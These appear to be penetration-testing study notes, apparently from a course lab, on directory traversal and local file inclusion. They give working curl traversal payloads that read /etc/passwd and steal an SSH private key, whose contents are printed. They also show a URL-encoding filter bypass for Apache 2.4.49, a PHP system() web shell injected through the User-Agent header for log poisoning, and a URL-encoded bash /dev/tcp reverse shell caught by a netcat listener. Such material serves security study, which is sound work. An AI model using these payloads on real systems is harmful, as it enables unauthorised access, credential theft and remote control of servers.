## Common Web Application Attacks

- Directory Traversal
- File Inclusion Vulnerabilities
- File Upload Attack Vulnerabilities
- Command Injection

### Understanding UNIX Directories 

#### /etc

Contains configuration files that vary for each machine, such as /etc/hosts & /etc/passwd. The /etc directory contains the files generally used in system administration. Most of the commands that previously resided in the /etc directory now reside in the /usr/sbin directory. However, for compatibility, the /usr/sbin directory contains symbolic links to the locations of some executable files. For example, /etc/chown is a symbolic link to /usr/bin/chown, and /etc/exportvg is a symbolic link to /usr/sbin/exportvg.

#### /bin

Symbolic link to the /usr/bin directory. In prior UNIX file systems, the /bin directory contained user commands that now reside in the /usr/bin directory.

#### /sbin

Contains files needed to boot the machine and mount the /usr file system. Most of the commands used during booting come from the boot image's RAM disk file system; therefore, very few commands reside in the /sbin directory.

#### /dev

Contains device nodes for special files for local devices. The /dev directory contains special files for tape drives, printers, disk partitions, and terminals.

#### /tmp

Serves as a mount point for a file system that contains system-generated temporary files. The /tmp file system is an empty directory.

#### /var

Serves as a mount point for files that vary on each machine. The /var file system is configured as a file system since the files it contains tend to grow.

#### /u

Symbolic link to the /home directory. 

#### /usr

Contains files that do not change and can be shared by machines such as executables and ASCII documentation. Standalone machines mount the root of a separate local file system over the /usr directory. Diskless machines and machines with limited disk resources mount a directory from a remote server over the /usr file system.

#### /home

Serves as a mount point for a file system containing user home directories. The /home file system contains per-user files and directories. In a standalone machine, the /home directory is contained in a separate file system whose root is mounted over the /home directory root file system. In a network, a server might contain user files that are accessible from several machines. In this case, the server copy of the /home directory is remotely mounted onto a local /home file system.

#### /export

Contains the directories and files on a server that are for remote clients. 

#### /lib

Symbolic link to the /usr/lib directory.

#### /tftpboot

Contains boot images and boot information for diskless clients. 

### Directory Traversal

Directory Traversal attacks, also known as path traversal attacks. This type of attack can be used to access sensitive files on a web server and typically occurs when a web application is not sanitizing user input.

In Linux systems, the /var/www/html/ directory is often used as the web root. When a web application displays a page, http://example.com/file.html for example, it will try to access /var/www/html/file.html. The http link doesn't contain any part of the path except the filename because the web root also serves as a base directory for a web server. If a web application is vulnerable to directory traversal, a user may access files outside of the web root by using relative paths, thus accessing sensitive files like SSH private keys or configuration files.

**We should always check for vulnerabilities by hovering over all buttons, checking all links, navigating to all accessible pages, and (if possible) examining the page's source code. Links can be an especially valuable source of information, providing parameters or other data about the application.**

```bash
https://example.com/cms/login.php?language=en.html
```
From this link, we can tell that the web app uses PHP, which holds assumptions about how the web app works. 

Second, the URL contains a language parameter with an HTML page as its value. In a situation like this, we should try to navigate to the file directly (https://example.com/cms/en.html). If we can successfully open it, we can confirm that en.html is a file on the server, meaning we can use this parameter to try other file names. We should always examine parameters closely when they use files as a value.

Third, the URL contains a directory called cms. This is important information indicating that the web application is running in a subdirectory of the web root.

If a page link is like ' http://mountaindesserts.com/meteor/index.php?page=blah ', then try injecting '../../../../../../etc/passwd' or '../../../../../../../../../home/offsec/.ssh/id_rsa' into the parameter and seeing what happens.

During web application assessments, we should understand that as soon as we've identified a possible vulnerability, such as with the "page" parameter in this case, we should not rely on a browser for testing. Browsers often try to parse or optimize elements for user friendliness. 

When performing web application testing, we should mainly use tools such as Burp, cURL, or a programming language of our choice.

Let's use curl to retrieve the SSH private key as we did with the browser:
```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
KCZOFoPU6kBkKyEhfjB82Ea1VoAvx4J4z7sNx1+wydQ/Kf7dawd95QjBuqLH9kQIEjkOGf
BemTOAyCdTBxzUhDz1siP9uyofquA5vhmMXWyy68pLKXpiQqTF+foGQGG90MBXS5hwskYg
...
lpWPWFQro9wzJ/uJsw/lepsqjrg2UvtrkAAADBAN5b6pbAdNmsQYmOIh8XALkNHwSusaK8
bM225OyFIxS+BLieT7iByDK4HwBmdExod29fFPwG/6mXUL2Dcjb6zKJl7AGiyqm5+0Ju5e
hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUVJ/XxpBrb
iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
+2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
-----END OPENSSH PRIVATE KEY-----
...
```

Let's use the private key to connect to the target system via SSH on port 2222. We can use the -i parameter to specify the stolen private key file and -p to specify the port. Before we can use the private key, we'll need to modify the permissions of the dt_key file so that only the user / owner can read the file; if we don't, the ssh program will throw an error stating that the access permissions are too open.
```bash
kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '/home/kali/dt_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
...

kali@kali:~$ chmod 400 dt_key

kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
...
offsec@68b68f3eb343:~$ 
```
On Linux, we usually use the /etc/passwd file to test directory
traversal vulnerabilities. On Windows, we can use the file **C:\Windows\System32\drivers\etc\hosts** to test directory traversal vulnerabilities, which is readable by all local users. By displaying this file, we can confirm the vulnerability exists and understand how the web application displays the contents of files.

After confirming the vulnerability, we can try to specify files containing sensitive information such as configuration files and logs.

In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd, check for private keys in their home directory, and use them to access the system via SSH. 

Sensitive files are more difficult to find on Windows. To identify files containing sensitive information, we need to closely examine the web application and collect information about the web server, framework, and programming language.

Once we gather information about the running application or service, we can research paths leading to sensitive files. For example, if we learn that a target system is running the Internet **Information Services (IIS)** web server, we can research its log paths and web root structure. Reviewing the Microsoft documentation, we learn that the logs are located at **"C:\inetpub\logs\LogFiles\W3SVC1\"**. Another file we should always check when the target is running an IIS web server is "**C:\inetpub\wwwroot\web.config**", which may contain sensitive information like passwords or usernames.

Windows uses backslashes instead of forward slashes for file paths. 

*Can you find out if a system is using Windows through the use of slashes?*

Use curl and multiple ../ sequences to try exploiting this directory traversal vulnerability in Apache 2.4.49 on the WEB18 machine.
```bash
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>


kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```
Because leveraging ../ is a known way to abuse web application behavior, this sequence is often filtered by either the web server, web application firewalls, or the web application itself.

Fortunately for us, we can use **URL Encoding**, also called **Percent Encoding**, to potentially bypass these filters. We can leverage specific ASCII encoding lists to manually encode our query or use the online converter on the same page. For now, we will only encode the dots, which are represented as "%2e".
```bash
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
alfred:x:1000:1000::/home/alfred:/bin/bash
```

Generally, URL encoding is used to convert characters of a web request into a format that can be transmitted over the internet.

### File Inclusion Vulnerabilities

File inclusion vulnerabilities allow us to "include" a file in the application's running code. This means we can use file inclusion vulnerabilities to execute local or remote files.

*Log Poisoning* works by modifying data we send to a web application so that the logs contain executable code. In an LFI vulnerability scenario, the local file we include is executed if it contains executable content. This means that if we manage to write executable code to a file and include it within the running code, it will be executed.

We'll first need to review what information is controlled by us and saved by Apache in the related log.

Use curl to analyze which elements comprise a log entry by displaying the file access.log using the previously-found directory traversal vulnerability. 
```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```
Before we send a request, we can modify the User Agent in Burp and specify what will be written to the access.log file.

The User-Agent request header is a characteristic string that lets servers and network peers identify the application, operating system, vendor, and/or version of the requesting user agent.
```bash
User-Agent: Mozilla/5.0 (<system-information>) <platform> (<platform-details>) <extensions>
```

Let's start Burp, open the browser, and navigate to the web page. We'll click on the Admin link at the bottom of the page, then switch back to Burp and click on the HTTP history tab. Let's select the related request and send it to Repeater.

We can now modify the User Agent to include the PHP code snippet of the following listing. This snippet accepts a command via the cmd parameter and executes it via the PHP system function on the target system. 
```php
<?php echo system($_GET['cmd']); ?>
```

The PHP code snippet was written to Apache's access.log file. By including the log file via the LFI vulnerability, we can execute the PHP code snippet.

To execute our snippet, we'll first update the page parameter in the current Burp request with a relative path.
```bash
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
```
```bash
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la HTTP/1.1
```

We have achieved command execution on the target system and can
leverage this to get a reverse shell or add our SSH key to the
authorized_keys file for a user.

**Obtain a reverse shell by adding a command to
the cmd parameter. We can use a common Bash TCP reverse shell
one-liner:
```bash
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```
**

Since we'll execute our command through the PHP system function, we should be aware that the command may be executed via the Bourne Shell. The reverse shell one-liner above contains syntax that is not supported by the Bourne Shell.

To ensure the reverse shell is executed via Bash, we need to modify the reverse shell command. We can do this by providing the reverse shell one-liner as argument to bash -c, which executes a command with Bash.
```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0<&1"
```
We'll once again encode the special characters with URL encoding.
```bash
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```
Revised.
```bash
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 HTTP/1.1
```

Before we send the request, let's start a Netcat listener on port 4444 on our Kali machine. It will receive the incoming reverse shell from the target system. Once the listener is started, we can press Send in Burp to send the request.
```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fbea640f9802:/var/www/html/meteor$ ls
admin.php
bavarian.php
css
fonts
img
index.php
js
```

Exploiting LFI on Windows only differs from Linux when it comes to file paths and code execution.

When we use Log Poisoning on Windows, we should understand that the log files are located in application-specific paths. For example, on a target running XAMPP, the Apache logs can be found in C:\xampp\apache\logs\.

Exploiting File Inclusion vulnerabilities depends heavily on the web application's programming language, the version, and the web server configuration. 

Outside PHP, we can also leverage LFI and RFI vulnerabilities in other frameworks or server-side scripting languages including Perl, Active Server Pages Extended, Active Server Pages, and Java Server Pages.
